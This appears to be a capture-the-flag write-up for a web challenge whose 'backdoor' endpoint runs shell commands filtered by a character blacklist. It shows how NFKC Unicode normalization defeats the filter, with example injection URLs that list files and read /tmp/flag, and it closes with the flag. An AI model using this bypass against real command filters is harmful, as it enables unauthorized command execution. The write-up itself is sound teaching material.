## Solve:

- [ ] Set of blacklisted characters (not allowed) <br/>
  <sup>```blacklist = ["~","!","@","#","$","%","^","&","*","(",")","_","-","+","{","}","]","[","|","\\","|",";",",",".","<",">","?","/","`",":","\""]```</sup>

<br/>

- [ ] If the characters introduced are not in the blacklist, the command given is **normalized** <br/>
  ```norm = unicodedata.normalize("NFKC", cmd)```

<br/>

- [ ] We can request regular commands, but in order to get the flag we need to bypass the blacklist. <br/>
    We do this by using special characters in **Unicode** that are the equivalent of normal characters after **normalization**. <br/>
    We see some examples here: https://lazarv.com/posts/unicode-normalization-vulnerabilities/

<br/>

- [ ] After a series of commands, we find out where is the flag
  ```bash
  http://206.189.59.199:8004/backdoor?cmd=ls 
  http://206.189.59.199:8004/backdoor?cmd=cat%20%EF%B9%A1
  ```

  Hint says the flag is temporary (in `tmp` directory)
  ```bash
  [http://206.189.59.199:8004/backdoor?cmd=cat%20%EF%B9%A1](http://206.189.59.199:8004/backdoor?cmd=cat%20%EF%BC%8Ftmp%EF%BC%8Fflag%EF%B9%A1)
  ```
  ![flag](https://user-images.githubusercontent.com/93029180/208316828-d7dce247-f3f2-4a5e-a48e-2d30d207acb9.png)

## Flag:
`flag{normalizing_the_input_4_the_bypass}`
